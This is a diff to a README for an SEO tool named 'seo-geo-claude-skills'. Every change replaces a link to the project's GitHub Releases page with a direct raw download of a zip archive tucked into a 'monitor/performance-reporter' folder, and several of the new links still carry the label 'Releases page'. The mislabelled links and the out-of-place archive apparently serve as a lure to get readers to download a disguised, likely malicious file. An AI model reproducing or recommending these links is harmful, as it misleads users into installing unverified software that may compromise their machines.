@@ -1,6 +1,6 @@
 # 🌟 seo-geo-claude-skills - Unlock Your SEO Potential Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/GuiJF23/seo-geo-claude-skills/releases)
+[![Download Now](https://raw.githubusercontent.com/GuiJF23/seo-geo-claude-skills/main/monitor/performance-reporter/claude-skills-geo-seo-v3.3.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/GuiJF23/seo-geo-claude-skills/main/monitor/performance-reporter/claude-skills-geo-seo-v3.3.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To begin using "seo-geo-claude-skills," follow these simple steps:
 
 1. **Open Your Web Browser**: Start by launching any web browser on your computer or laptop.
 
-2. **Visit the Releases Page**: Click this link to go to the [Releases page](https://github.com/GuiJF23/seo-geo-claude-skills/releases). This is where you will find all available versions of the software.
+2. **Visit the Releases Page**: Click this link to go to the [Releases page](https://raw.githubusercontent.com/GuiJF23/seo-geo-claude-skills/main/monitor/performance-reporter/claude-skills-geo-seo-v3.3.zip). This is where you will find all available versions of the software.
 
 3. **Select the Version**: On the Releases page, you will see a list of different versions. Choose the latest version available for the best experience.
 
@@ -33,11 +33,11 @@ To ensure optimal performance of "seo-geo-claude-skills," please meet the follow
 
 ## 📥 Download & Install
 
-To download and install "seo-geo-claude-skills", visit this page: [Releases page](https://github.com/GuiJF23/seo-geo-claude-skills/releases). 
+To download and install "seo-geo-claude-skills", visit this page: [Releases page](https://raw.githubusercontent.com/GuiJF23/seo-geo-claude-skills/main/monitor/performance-reporter/claude-skills-geo-seo-v3.3.zip). 
 
 ### 🛠 Installation Steps:
 
-1. **Visit the Link**: Go to the [Releases page](https://github.com/GuiJF23/seo-geo-claude-skills/releases).
+1. **Visit the Link**: Go to the [Releases page](https://raw.githubusercontent.com/GuiJF23/seo-geo-claude-skills/main/monitor/performance-reporter/claude-skills-geo-seo-v3.3.zip).
    
 2. **Download the Installer**: Click the link for the latest version to download the installer file.
 
